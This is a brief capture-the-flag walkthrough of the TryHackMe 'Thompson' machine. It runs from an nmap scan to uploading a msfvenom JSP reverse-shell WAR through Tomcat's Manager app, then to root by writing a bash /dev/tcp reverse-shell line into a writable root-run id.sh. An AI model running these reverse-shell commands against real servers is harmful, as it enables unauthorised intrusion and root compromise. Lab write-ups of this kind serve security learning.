T0fuHasuu
---

# **Thompson Walkthrough**  
[**Source**](https://medium.com/@chandrakanthr899/thompson-tryhackme-walkthrough-1003d6e8ad83)

![Chill](https://media.tenor.com/EgwiQ8PGbXMAAAAM/machine-gun-sylvester-stallone.gif)  

---

### **1. Scan for Open Ports with Nmap**
Run the following command to scan the target IP:  
```bash
nmap <IP>
```

- **Results:**  
  - Port **22**: SSH  
  - Port **8009**: AJP13  
  - Port **8080**: HTTP  

- Let's enter **8080** with :
    ```bash
    http://<IP>:8080
    ```
    - Enter the **Manager app** on the screen
    - We can inject here with listener in War file From [Here](https://www.baeldung.com/tomcat-deploy-war) 

---

### **2. Create self War injection**
Create by :
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war > shell.war
```

### **3. Inject Shell listener**
Start By Upload the **shell.war** file in the **Manager App** section
> Set **listener** :
```bash
nc -lvp 4444
```
> View What's in **Jack** folder :
```bash
ls -al home/jack
```
  - You will see **user.txt** file
  - View user.txt : `cat home/jack/user.txt`

   **One Flag Down**

### **4. Enter Root Privilage**
- When Look at the files in Jack folder again :
  - You will see that **id.sh** is in root
  - It is **overwrittable**
- Put listener in that root **id.sh** by : 
```bash
echo 'bash -i >& dev/tcp/<IP>/1234 0>&1' > id.sh
```
- Run the listener by : `nc -lvp 1234`
- We got into Root!!!
 
### **5. Search for root.txt**

Get the Root Flag : 
```bash
cat root/root.txt
```

**Done . . .**

---

![Bye](https://media2.giphy.com/media/h2OLfcSKKthRK/giphy.gif?w=144)

---

# I'll see yall next time